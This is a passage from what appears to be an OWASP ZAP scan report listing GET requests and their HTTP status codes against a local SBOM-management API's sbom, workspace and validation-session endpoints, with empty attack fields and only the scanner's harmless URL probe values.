* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-repair-draft
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-repair-draft`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-repair-draft/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-repair-draft/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/history
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/history`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/history/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/history/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/5843534002169369556
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/repair/5843534002169369556`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search%3Fq=q&source=repair_draft&limit=100
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search (limit,q,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search%3Fq=q&source=http%253A%252F%252Fwww.google.com%252F&limit=100
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search (limit,q,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/search/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/4816805694921845018
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/4816805694921845018`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/2311627939983146459
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/2311627939983146459`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/1006699758364380215
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/ai/1006699758364380215`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content%3Fsource=repair_draft&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content%3Fsource=http%253A%252F%252Fwww.google.com%252F&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines%3Fsource=repair_draft&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines%3Fsource=http%253A%252F%252Fwww.google.com%252F&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content-lines/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/7720046925785347007
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/7720046925785347007`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk%3Fsource=repair_draft&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk%3Fsource=http%253A%252F%252Fwww.google.com%252F&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/chunk/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines%3Fsource=repair_draft&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines%3Fsource=http%253A%252F%252Fwww.google.com%252F&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/content/lines/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-original
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-original`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-original/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-original/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-repair-draft
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-repair-draft`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-repair-draft/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/download-repair-draft/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/history
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/history`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/history/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/history/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/374533464268624419
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/repair/374533464268624419`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/search
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/search`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/search%3Fq=q&source=repair_draft&limit=100
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/search (limit,q,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/search%3Fq=q&source=http%253A%252F%252Fwww.google.com%252F&limit=100
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/search (limit,q,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-workspaces/session_id/search/
  * Node Name: `http://host.docker.internal:8000/api/sbom-workspaces/session_id/search/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms%3Fuser_id=&status=&stage=&page=1&page_size=50&cursor=
  * Node Name: `http://host.docker.internal:8000/api/sboms (cursor,page,page_size,stage,status,user_id)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10
  * Node Name: `http://host.docker.internal:8000/api/sboms/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10%3Finclude_raw=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/10 (include_raw)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10%3Finclude_raw=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/sboms/10 (include_raw)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/5734010220362485899
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/5734010220362485899`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analysis-runs
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analysis-runs`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analysis-runs%3Fpage=1&page_size=50
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analysis-runs (page,page_size)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analysis-runs%3Fpage=http%253A%252F%252Fwww.google.com%252F&page_size=50
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analysis-runs (page,page_size)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analysis-runs/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analysis-runs/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/analyze/925051822897398914
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/analyze/925051822897398914`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components%3Finclude_duplicates=false&duplicate_only=false&dedupe_group_id=&normalized_name=&normalized_purl=&page=1&page_size=100&search=ZAP&sort_by=http%253A%252F%252Fwww.google.com%252F&sort_order=asc
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components (dedupe_group_id,duplicate_only,include_duplicates,normalized_name,normalized_purl,page,page_size,search,sort_by,sort_order)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components%3Finclude_duplicates=false&duplicate_only=false&dedupe_group_id=&normalized_name=&normalized_purl=&page=1&page_size=100&search=ZAP&sort_by=name&sort_order=asc
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components (dedupe_group_id,duplicate_only,include_duplicates,normalized_name,normalized_purl,page,page_size,search,sort_by,sort_order)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components%3Finclude_duplicates=http%253A%252F%252Fwww.google.com%252F&duplicate_only=false&dedupe_group_id=&normalized_name=&normalized_purl=&page=1&page_size=100&search=ZAP&sort_by=name&sort_order=asc
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components (dedupe_group_id,duplicate_only,include_duplicates,normalized_name,normalized_purl,page,page_size,search,sort_by,sort_order)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/components/7529396363340158875
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/components/7529396363340158875`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/conversion-report
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/conversion-report`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/conversion-report/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/conversion-report/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/convert
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/convert`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/convert/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/convert/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/convert/4777079783968851766
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/convert/4777079783968851766`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/dedupe-report
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/dedupe-report`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/dedupe-report/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/dedupe-report/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/delete-impact
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/delete-impact`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/delete-impact/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/delete-impact/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/download
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/download`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/download/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/download/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/export
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/export`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/export%3Fformat=native&export_mode=http%253A%252F%252Fwww.google.com%252F&include_duplicates=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/export (export_mode,format,include_duplicates)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/export%3Fformat=native&export_mode=original&include_duplicates=false
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/export (export_mode,format,include_duplicates)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/export%3Fformat=native&export_mode=original&include_duplicates=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/export (export_mode,format,include_duplicates)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/export/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/export/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/info
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/info`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/info/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/info/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle%3Fpage=1&page_size=25
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle (page,page_size)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle%3Fpage=http%253A%252F%252Fwww.google.com%252F&page_size=25
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle (page,page_size)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/3392621176019651951
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/3392621176019651951`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/diagnostics
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/diagnostics`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/diagnostics/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/diagnostics/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/report
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/report`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/report%3Fformat=json&report_type=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/report (format,report_type)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/report%3Fformat=http%253A%252F%252Fwww.google.com%252F&report_type=
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/report (format,report_type)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/lifecycle/report/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/lifecycle/report/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/normalization-report
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/normalization-report`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/normalization-report/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/normalization-report/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/raw
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/raw`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/raw%3Foffset=0&limit=500
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/raw (limit,offset)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/raw%3Foffset=http%253A%252F%252Fwww.google.com%252F&limit=500
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/raw (limit,offset)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/raw/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/raw/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/4120561739353291462
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/4120561739353291462`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/lifecycle-pack
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/lifecycle-pack`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/lifecycle-pack/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/lifecycle-pack/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/vex-pack
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/vex-pack`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/vex-pack/
  * Node Name: `http://host.docker.internal:8000/api/sboms/10/reports/vex-pack/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sboms/10/reports/vulnerabilities.xlsx
